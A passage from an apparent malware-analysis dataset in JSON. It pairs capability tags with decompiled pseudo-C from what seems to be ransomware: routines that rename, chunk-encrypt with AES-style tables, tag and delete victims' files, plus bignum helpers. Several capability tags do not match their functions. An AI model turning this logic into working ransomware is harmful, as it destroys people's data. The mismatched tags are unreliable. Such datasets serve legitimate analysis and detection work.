code_r0x0040532e;\n        }\n        arg_ch = 0x10;\n    }\n    else if ((arg_ch != 0x10) || (cVar2 != '0')) goto code_r0x0040532e;\n    if ((*pcVar4 == 'x') || (*pcVar4 == 'X')) {\n        cVar2 = pcVar4[1];\n        pcVar4 = pcVar4 + 2;\n    }\ncode_r0x0040532e:\n    uVar1 = 0xffffffff / arg_ch;\n    do {\n        if (cVar2 - 0x30U < 10) {\n            uVar3 = cVar2 - 0x30;\n        }\n        else if (cVar2 + 0xbfU < 6) {\n            uVar3 = cVar2 - 0x37;\n        }\n        else {\n            if (5 < cVar2 + 0x9fU) {\ncode_r0x00405385:\n                pcVar4 = pcVar4 + -1;\n                if ((arg_10h & 8) == 0) {\n                    if (arg_8h != NULL) {\n                        pcVar4 = unaff_EBX;\n                    }\n                    var_4h = 0;\n                }\n                else if (((arg_10h & 4) != 0) ||\n                        (((arg_10h & 1) == 0 &&\n                         ((((arg_10h & 2) != 0 && (0x80000000 < var_4h)) ||\n                          (((arg_10h & 2) == 0 && (0x7fffffff < var_4h)))))))) {\n                    if ((arg_10h & 1) == 0) {\n                        var_4h = ((arg_10h & 2) != 0) + 0x7fffffff;\n                    }\n                    else {\n                        var_4h = 0xffffffff;\n                    }\n                }\n                if (arg_8h != NULL) {\n                    *arg_8h = pcVar4;\n                }\n                if ((arg_10h & 2) == 0) {\n                    return var_4h;\n                }\n                return -var_4h;\n            }\n            uVar3 = cVar2 - 0x57;\n        }\n        if (arg_ch <= uVar3) goto code_r0x00405385;\n        if ((var_4h < uVar1) || ((var_4h == uVar1 && (uVar3 <= 0xffffffff % arg_ch)))) {\n            var_4h = var_4h * arg_ch + uVar3;\n            arg_10h = arg_10h | 8;\n        }\n        else {\n            arg_10h = arg_10h | 0xc;\n            if (arg_8h == NULL) goto code_r0x00405385;\n        }\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 1034
    },
    "0040547b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040547b(uint hFile, int32_t arg_ch, int32_t lpBuffer)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    int64_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t dwMoveMethod;\n    int32_t var_10h;\n    int32_t lpNumberOfBytesRead;\n    \n    bVar6 = false;\n    dwMoveMethod = 0;\n    var_10h = 0;\n    iVar4 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, 0, 0, &dwMoveMethod, 2);\n    iVar3 = var_10h;\n    uVar2 = dwMoveMethod;\n    if ((iVar4 != 0) && ((var_10h != 0 || (0xbffff < dwMoveMethod)))) {\n        iVar7 = fcn.00408b50(dwMoveMethod, var_10h, 3, 0);\n        iVar1 = 0;\n        uVar5 = 0;\n        while( true ) {\n            if (uVar5 == 2) {\n                iVar1 = CONCAT44(iVar3 + -1 + (0x3ffff < uVar2), uVar2 - 0x40000);\n            }\n            *(arg_ch + uVar5 * 8) = iVar1;\n            *(arg_ch + 4 + uVar5 * 8) = iVar1 >> 0x20;\n            _dwMoveMethod = iVar1;\n            iVar4 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, iVar1, &dwMoveMethod, 0);\n            if ((iVar4 == 0) || (iVar1 != _dwMoveMethod)) break;\n            iVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)(hFile, lpBuffer, 0x40000, &lpNumberOfBytesRead, 0);\n            if ((iVar4 == 0) || (lpNumberOfBytesRead != 0x40000)) break;\n            iVar1 = iVar7 + iVar1;\n            lpBuffer = lpBuffer + 0x40000;\n            uVar5 = uVar5 + 1;\n            if (2 < uVar5) break;\n        }\n        bVar6 = uVar5 == 3;\n    }\n    return bVar6;\n}\n",
        "token_count": 561
    },
    "004056ca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004056ca(int32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint8_t *in_ECX;\n    \n    uVar1 = ~in_EAX;\n    for (; arg_8h != 0; arg_8h = arg_8h + -1) {\n        uVar1 = uVar1 >> 8 ^ *(((*in_ECX ^ uVar1) & 0xff) * 4 + 0x40a000);\n        in_ECX = in_ECX + 1;\n    }\n    return ~uVar1;\n}\n",
        "token_count": 142
    },
    "00405804": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405804(uint arg_8h, uint lpExistingFileName, uint lpNewFileName, uint32_t arg_14h)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_158h;\n    uint *var_30h;\n    uint var_2ch;\n    int32_t lpNumberOfBytesWritten;\n    int32_t var_24h;\n    uint liDistanceToMove;\n    uint lpNewFilePointer;\n    uint *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t hObject;\n    \n    var_8h = 0;\n    var_2ch = fcn.004056ad(lpExistingFileName);\n    iVar2 = fcn.00404d94(var_2ch);\n    puVar1 = in_EAX[8];\n    var_14h = puVar1 + 0xe;\n    var_30h = puVar1 + 0x3000e;\n    var_24h = iVar2 * 2 + 2;\n    if ((var_30h + (var_24h - puVar1) & 0xfU) == 0) {\n        iVar2 = -puVar1;\n    }\n    else {\n        iVar2 = (-puVar1 - (var_30h + (var_24h - puVar1) & 0xfU)) + 0x10;\n    }\n    var_10h = var_30h + var_24h + iVar2;\n    iVar2 = puVar1 + var_10h;\n    var_ch = iVar2 + 0xb2;\n    if ((((var_ch - puVar1) + 0x40018U <= in_EAX[9]) &&\n        (iVar3 = (*_sym.imp.KERNEL32.dll_MoveFileW)(lpExistingFileName, lpNewFileName),  iVar3 != 0)) &&\n       (hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpNewFileName, 0xc0000000, 0, 0, 3, 0, 0),  hObject != -1)) {\n        iVar3 = fcn.0040547b(hObject, puVar1 + 8, var_14h);\n        if (iVar3 != 0) {\n            fcn.00404c71(var_ch, puVar1 + 8, 0x18);\n            *puVar1 = 0;\n            puVar1[1] = 1;\n            puVar1[2] = 0xaf77bc0f;\n            puVar1[3] = 3;\n            puVar1[4] = 0x40000;\n            uVar4 = fcn.004056ca(0xc0000);\n            puVar1[5] = uVar4;\n            puVar1[6] = 0xc0038;\n            fcn.00404c71(var_30h, var_2ch, var_24h);\n            iVar5 = fcn.00407969(&var_158h, *in_EAX, arg_8h);\n            iVar3 = var_10h;\n            if ((iVar5 == 0) && (iVar5 = fcn.00407df9(&var_158h, in_EAX[8]),  iVar5 != 0)) {\n                fcn.004076e5(&var_158h);\n                fcn.00404c71(iVar2, in_EAX + 1, 0x14);\n                fcn.00404c71(iVar2 + 0x14, arg_8h, 0x10);\n                fcn.00404c71(iVar2 + 0x28, *in_EAX + 0x20, 0x80);\n                fcn.00404c71(iVar2 + 0xac, in_EAX + 6, 6);\n                iVar5 = hObject;\n                *(iVar2 + 0x24) = 0;\n                *(iVar2 + 0xa8) = iVar3 + 0xb2;\n                liDistanceToMove = 0;\n                lpNewFilePointer = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hObject, 0, 0, &liDistanceToMove, 2);\n                if ((iVar3 != 0) &&\n                   ((iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                                       (iVar5, in_EAX[8], *(iVar2 + 0xa8), &lpNumberOfBytesWritten, 0),  iVar3 != 0 &&\n                    (lpNumberOfBytesWritten == *(iVar2 + 0xa8))))) {\n                    (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar5);\n                    fcn.0040555d(iVar5, var_ch + 0x18);\n                    if ((arg_14h & 2) != 0) {\n                        (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(iVar5);\n                    }\n                    var_8h = 1;\n                }\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        if (var_8h != 0) {\n            return var_8h;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_MoveFileW)(lpNewFileName, lpExistingFileName);\n    return var_8h;\n}\n",
        "token_count": 1215
    },
    "00405a75": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405a75(uint arg_8h, uint lpFileName, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_288h;\n    uint var_160h;\n    int32_t var_38h;\n    uint var_34h;\n    uint *var_30h;\n    uint32_t lpNumberOfBytesWritten;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint32_t nNumberOfBytesToRead;\n    uint32_t liDistanceToMove;\n    uint32_t lpNewFilePointer;\n    int32_t hFile;\n    int32_t var_8h;\n    uint32_t nNumberOfBytesToWrite;\n    \n    var_24h = 0;\n    nNumberOfBytesToRead = in_EAX[9] - (in_EAX[9] & 0xfU);\n    var_34h = fcn.004056ad(lpFileName);\n    iVar3 = fcn.00404d94(var_34h);\n    puVar1 = in_EAX[8];\n    var_30h = puVar1 + 8;\n    var_38h = iVar3 * 2 + 2;\n    if ((var_30h + (var_38h - puVar1) & 0xfU) == 0) {\n        iVar3 = -puVar1;\n    }\n    else {\n        iVar3 = (-puVar1 - (var_30h + (var_38h - puVar1) & 0xfU)) + 0x10;\n    }\n    var_28h = var_30h + var_38h + iVar3;\n    iVar3 = puVar1 + var_28h;\n    var_20h = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(lpFileName);\n    var_8h = -1;\n    if ((((iVar3 - in_EAX[8]) + 0xb2U <= nNumberOfBytesToRead) &&\n        (iVar4 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(arg_10h),  iVar4 == -1)) &&\n       (hFile = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0xc0000000, 0, 0, 3, 0, 0),  hFile != -1)) {\n        lpNewFilePointer = 0;\n        liDistanceToMove = 0;\n        iVar4 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, 0, 0, &liDistanceToMove, 2);\n        if ((iVar4 != 0) && ((liDistanceToMove | lpNewFilePointer) != 0)) {\n            liDistanceToMove = 0;\n            lpNewFilePointer = 0;\n            iVar4 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, 0, 0, &liDistanceToMove, 0);\n            if ((iVar4 != 0) &&\n               ((var_8h = (*_sym.imp.KERNEL32.dll_CreateFileW)(arg_10h, 0x40000000, 1, 0, 1, var_20h, 0),  var_8h != -1\n                && (iVar4 = fcn.00407969(&var_288h, *in_EAX, arg_8h),  iVar4 == 0)))) {\n                do {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                      (hFile, in_EAX[8], nNumberOfBytesToRead, &nNumberOfBytesToWrite, 0);\n                    if (iVar4 == 0) goto code_r0x00405d86;\n                    if (nNumberOfBytesToWrite < nNumberOfBytesToRead) {\n                        var_20h = 0x10 - (nNumberOfBytesToWrite & 0xf);\n                        fcn.00404c43(in_EAX[8] + nNumberOfBytesToWrite, 0, var_20h);\n                        nNumberOfBytesToWrite = nNumberOfBytesToWrite + var_20h;\n                    }\n                    iVar4 = fcn.00407df9(&var_288h, in_EAX[8]);\n                    if (((iVar4 == 0) ||\n                        (iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                                           (var_8h, in_EAX[8], nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0), \n                        iVar4 == 0)) || (lpNumberOfBytesWritten != nNumberOfBytesToWrite)) goto code_r0x00405d86;\n                } while (nNumberOfBytesToRead <= nNumberOfBytesToWrite);\n                *puVar1 = 0;\n                puVar1[1] = 2;\n                puVar1[2] = 0xf0a75e12;\n                puVar1[6] = 0x20;\n                fcn.00404c71(var_30h, var_34h, var_38h);\n                fcn.00404c71(iVar3, in_EAX + 1, 0x14);\n                fcn.00404c71(iVar3 + 0x14, arg_8h, 0x10);\n                fcn.00404c71(iVar3 + 0x28, *in_EAX + 0x20, 0x80);\n                fcn.00404c71(iVar3 + 0xac, in_EAX + 6, 6);\n                *(iVar3 + 0x24) = var_20h;\n                *(iVar3 + 0xa8) = var_28h + 0xb2;\n                iVar4 = fcn.00407969(&var_160h, *in_EAX, arg_8h);\n                if ((iVar4 == 0) && (iVar4 = fcn.00407df9(&var_160h, in_EAX[8]),  iVar4 != 0)) {\n                    fcn.004076e5(&var_160h);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                                      (var_8h, in_EAX[8], *(iVar3 + 0xa8), &lpNumberOfBytesWritten, 0);\n                    if ((iVar4 != 0) && (lpNumberOfBytesWritten == *(iVar3 + 0xa8))) {\n                        if ((arg_14h & 4) != 0) {\n                            fcn.004055cc(hFile);\n                        }\n                        pcVar2 = _sym.imp.KERNEL32.dll_FlushFileBuffers;\n                        if ((arg_14h & 2) != 0) {\n                            (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(hFile);\n                            (*pcVar2)(var_8h);\n                        }\n                        var_24h = 1;\n                    }\n                }\ncode_r0x00405d86:\n                fcn.004076e5(&var_288h);\n            }\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hFile);\n        if (var_8h != -1) {\n            (*pcVar2)(var_8h);\n        }\n        if ((var_24h != 0) || (lpFileName = arg_10h,  var_8h != -1)) {\n            (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n        }\n    }\n    return var_24h;\n}\n",
        "token_count": 1689
    },
    "00405dcb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405dcb(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_EDI;\n    uint32_t lpFileSize;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n    if (iVar2 == -1) {\n        return var_4h;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(iVar2, &lpFileSize);\n    if (iVar3 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        iVar2 = -1;\n        var_18h = lpFileSize;\n        var_14h = var_1ch;\n        if ((lpFileSize | var_1ch) == 0) {\n            return var_4h;\n        }\n        var_ch = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)();\n        pcVar1 = _sym.imp.KERNEL32.dll_SetFileAttributesW;\n        if (var_ch == 0xffffffff) {\n            return var_4h;\n        }\n        var_8h = var_ch & 1;\n        if (var_8h != 0) {\n            (*_sym.imp.KERNEL32.dll_SetFileAttributesW)();\n        }\n        if (((arg_14h & 1) == 0) && ((var_14h != 0 || (0x17ffff < var_18h)))) {\n            var_4h = fcn.00405804(arg_ch, unaff_EDI, arg_10h, arg_14h);\n        }\n        else {\n            var_4h = fcn.00405a75(arg_ch, unaff_EDI, arg_10h, arg_14h);\n        }\n        if (var_8h == 0) {\n            return var_4h;\n        }\n        if (var_4h != 0) {\n            (*pcVar1)(arg_10h, var_ch);\n            return var_4h;\n        }\n        (*pcVar1)();\n    }\n    if (iVar2 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return var_4h;\n}\n",
        "token_count": 568
    },
    "004061e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004061e8(void)\n\n{\n    int32_t in_EAX;\n    \n    while ((*(*(in_EAX + 0xc) + -2 + *(in_EAX + 4) * 2) == 0 && (1 < *(in_EAX + 4)))) {\n        *(in_EAX + 4) = *(in_EAX + 4) + -1;\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "00406389": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00406389(void)\n\n{\n    int32_t unaff_ESI;\n    \n    if (*(unaff_ESI + 8) != 1) {\n        fcn.00405444();\n    }\n    *(unaff_ESI + 8) = 0x7fff55aa;\n    return;\n}\n",
        "token_count": 70
    },
    "004063d6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004063d6(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00406373();\n    fcn.0040634a();\n    if (*(in_EAX + 0x1c) != 0) {\n        fcn.00405444();\n    }\n    fcn.004063ac();\n    fcn.00404d6a(in_EAX);\n    return;\n}\n",
        "token_count": 91
    },
    "00406406": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint * fcn.00406406(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBX;\n    \n    puVar1 = *(unaff_EBX + 4);\n    if (puVar1 == NULL) {\n        puVar1 = fcn.00404cfe(0x10);\n        uVar2 = fcn.00404cfe(in_EAX * 2);\n        puVar1[3] = uVar2;\n        *(puVar1 + 6) = in_EAX;\n    }\n    else {\n        uVar2 = *puVar1;\n        *(unaff_EBX + 0x20) = *(unaff_EBX + 0x20) + -1;\n        *(unaff_EBX + 4) = uVar2;\n        if (puVar1[2] != 0) {\n            fcn.00405444();\n        }\n        fcn.00406284();\n    }\n    *puVar1 = 0;\n    *(puVar1 + 1) = in_EAX;\n    puVar1[2] = 1;\n    *(unaff_EBX + 0x1c) = *(unaff_EBX + 0x1c) + 1;\n    return puVar1;\n}\n",
        "token_count": 292
    },
    "004065b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004065b6(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00406406();\n    iVar4 = 0;\n    fcn.00404c43(*(iVar1 + 0xc), 0, *(iVar1 + 4) * 2);\n    iVar3 = in_EAX + -1;\n    if (-1 < iVar3) {\n        var_4h = 0;\n        do {\n            piVar2 = *(iVar1 + 0xc) + var_4h;\n            *piVar2 = *piVar2 + (*(iVar3 + arg_8h) << (iVar4 << 3 & 0x1f));\n            iVar4 = iVar4 + 1;\n            if (iVar4 == 2) {\n                iVar4 = 0;\n                var_4h = var_4h + 2;\n            }\n            iVar3 = iVar3 + -1;\n        } while (-1 < iVar3);\n    }\n    fcn.004061e8();\n    return;\n}\n",
        "token_count": 278
    },
    "00406871": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00406871(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t arg_ch_00;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint *arg_10h_00;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *(arg_8h + 0x24);\n    var_ch = 0;\n    var_1ch = *(arg_ch + 4);\n    var_24h = *(arg_10h + 4);\n    iVar7 = var_1ch - var_24h;\n    var_14h = var_24h;\n    iVar4 = fcn.004062ce();\n    if (iVar4 < 1) {\n        var_10h = fcn.00406406();\n        var_24h = var_24h + 1;\n        arg_ch_00 = fcn.00406406();\n        iVar4 = fcn.004061e8();\n        var_18h = 0x10000 / (*(*(iVar4 + 0xc) + -2 + *(iVar4 + 4) * 2) + 1) & 0xffff;\n        fcn.00404c43(*(var_10h + 0xc), 0, *(var_10h + 4) * 2);\n        if (1 < var_18h) {\n            arg_ch = fcn.00406622(arg_8h, arg_ch, var_18h);\n            iVar4 = *(arg_8h + 0x10 + var_1h * 4);\n        }\n        if (var_1ch == *(arg_ch + 4)) {\n            fcn.00406284();\n        }\n        var_1ch = var_14h * 2 + 2;\n        do {\n            fcn.00404c71(*(arg_ch_00 + 0xc), *(arg_ch + 0xc) + -2 + ((*(arg_ch + 4) - var_ch) - var_14h) * 2, var_1ch);\n            var_20h = *(iVar4 + 4);\n            uVar2 = *(*(iVar4 + 0xc) + -2 + var_20h * 2);\n            if (*(*(arg_ch_00 + 0xc) + -2 + *(arg_ch_00 + 4) * 2) == uVar2) {\n                var_8h = 0xffff;\ncode_r0x00406a35:\n                arg_10h_00 = &var_28h;\n                uVar6 = var_8h;\n                uVar5 = fcn.0040639c();\n                uVar5 = fcn.00406622(arg_8h, uVar5, uVar6);\n                arg_ch_00 = fcn.004066a9(arg_8h, uVar5, arg_10h_00);\n                fcn.00406284();\n                *(*(var_10h + 0xc) + -2 + (*(var_10h + 4) - var_ch) * 2) = var_8h;\n                if (var_28h != 0) {\n                    piVar1 = *(var_10h + 0xc) + -2 + (*(var_10h + 4) - var_ch) * 2;\n                    *piVar1 = *piVar1 + -1;\n                    uVar5 = fcn.0040639c();\n                    arg_ch_00 = fcn.0040672e(arg_8h, arg_ch_00, uVar5);\n                    *(arg_ch_00 + 4) = *(arg_ch_00 + 4) + -1;\n                    *(iVar4 + 4) = *(iVar4 + 4) + -1;\n                }\n            }\n            else {\n                var_8h = CONCAT22(*(*(arg_ch_00 + 0xc) + -2 + *(arg_ch_00 + 4) * 2), \n                                  *(*(arg_ch_00 + 0xc) + -4 + *(arg_ch_00 + 4) * 2)) / uVar2 & 0xffff;\n                if (((1 < *(iVar4 + 4)) && (uVar3 = *(*(iVar4 + 0xc) + -4 + var_20h * 2),  var_20h = uVar3,  uVar3 != 0)\n                    ) && (uVar6 = CONCAT22(*(*(arg_ch_00 + 0xc) + -4 + *(arg_ch_00 + 4) * 2) - uVar2 * var_8h, \n                                           *(*(arg_ch_00 + 0xc) + -6 + *(arg_ch_00 + 4) * 2)), \n                         uVar6 <= var_20h * var_8h && var_20h * var_8h - uVar6 != 0)) {\n                    var_8h = var_8h + 0xffff;\n                }\n                if (var_8h != 0) goto code_r0x00406a35;\n                *(*(var_10h + 0xc) + -2 + (*(var_10h + 4) - var_ch) * 2) = 0;\n            }\n            fcn.00404c71(*(arg_ch + 0xc) + -2 + ((*(arg_ch + 4) - var_ch) - var_14h) * 2, *(arg_ch_00 + 0xc), var_1ch);\n            var_ch = var_ch + 1;\n        } while (var_ch <= iVar7);\n        fcn.0040634a();\n        fcn.0040634a();\n        fcn.0040634a();\n        fcn.004061e8();\n        arg_ch = fcn.0040631d();\n    }\n    else {\n        fcn.0040634a();\n    }\n    return arg_ch;\n}\n",
        "token_count": 1475
    },
    "00406ca2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406ca2(int32_t *arg_8h)\n\n{\n    uint32_t *in_EAX;\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *unaff_ESI;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar1 = arg_8h[1];\n    var_4h = in_EAX[1] ^ puVar1[1];\n    var_8h = in_EAX[2] ^ puVar1[2];\n    var_14h = *in_EAX ^ *puVar1;\n    uVar2 = in_EAX[3] ^ puVar1[3];\n    var_18h = *arg_8h >> 1;\n    puVar1 = puVar1 + 4;\n    while( true ) {\n        var_18h = var_18h + -1;\n        if (var_18h < 1) break;\n        uVar3 = *((uVar2 >> 8 & 0xff) * 4 + 0x40add0) ^ *((var_8h >> 0x10 & 0xff) * 4 + 0x40a9a8) ^\n                *((var_4h >> 0x18) * 4 + 0x40a5a8) ^ *((var_14h & 0xff) * 4 + 0x40b1d0) ^ *puVar1;\n        uVar7 = *((var_4h >> 8 & 0xff) * 4 + 0x40add0) ^ *((var_14h >> 0x10 & 0xff) * 4 + 0x40a9a8) ^\n                *((uVar2 >> 0x18) * 4 + 0x40a5a8) ^ *((var_8h & 0xff) * 4 + 0x40b1d0) ^ puVar1[2];\n        uVar4 = *((uVar2 >> 0x10 & 0xff) * 4 + 0x40a9a8) ^ *((var_14h >> 8 & 0xff) * 4 + 0x40add0) ^\n                *((var_8h >> 0x18) * 4 + 0x40a5a8) ^ *((var_4h & 0xff) * 4 + 0x40b1d0) ^ puVar1[1];\n        uVar2 = *((var_8h >> 8 & 0xff) * 4 + 0x40add0) ^ *((var_4h >> 0x10 & 0xff) * 4 + 0x40a9a8) ^\n                *((var_14h >> 0x18) * 4 + 0x40a5a8) ^ *((uVar2 & 0xff) * 4 + 0x40b1d0) ^ puVar1[3];\n        var_14h = *((uVar2 >> 8 & 0xff) * 4 + 0x40add0) ^ *((uVar7 >> 0x10 & 0xff) * 4 + 0x40a9a8) ^\n                  *((uVar4 >> 0x18) * 4 + 0x40a5a8) ^ *((uVar3 & 0xff) * 4 + 0x40b1d0) ^ puVar1[4];\n        var_4h = *((uVar2 >> 0x10 & 0xff) * 4 + 0x40a9a8) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x40add0) ^\n                 *((uVar7 >> 0x18) * 4 + 0x40a5a8) ^ *((uVar4 & 0xff) * 4 + 0x40b1d0) ^ puVar1[5];\n        var_8h = *((uVar4 >> 8 & 0xff) * 4 + 0x40add0) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x40a9a8) ^\n                 *((uVar2 >> 0x18) * 4 + 0x40a5a8) ^ *((uVar7 & 0xff) * 4 + 0x40b1d0) ^ puVar1[6];\n        uVar2 = *((uVar7 >> 8 & 0xff) * 4 + 0x40add0) ^ *((uVar4 >> 0x10 & 0xff) * 4 + 0x40a9a8) ^\n                *((uVar3 >> 0x18) * 4 + 0x40a5a8) ^ *((uVar2 & 0xff) * 4 + 0x40b1d0) ^ puVar1[7];\n        puVar1 = puVar1 + 8;\n    }\n    uVar3 = *((uVar2 >> 8 & 0xff) * 4 + 0x40add0) ^ *((var_8h >> 0x10 & 0xff) * 4 + 0x40a9a8) ^\n            *((var_4h >> 0x18) * 4 + 0x40a5a8) ^ *((var_14h & 0xff) * 4 + 0x40b1d0) ^ *puVar1;\n    uVar4 = *((var_4h >> 8 & 0xff) * 4 + 0x40add0) ^ *((var_14h >> 0x10 & 0xff) * 4 + 0x40a9a8) ^\n            *((uVar2 >> 0x18) * 4 + 0x40a5a8) ^ *((var_8h & 0xff) * 4 + 0x40b1d0) ^ puVar1[2];\n 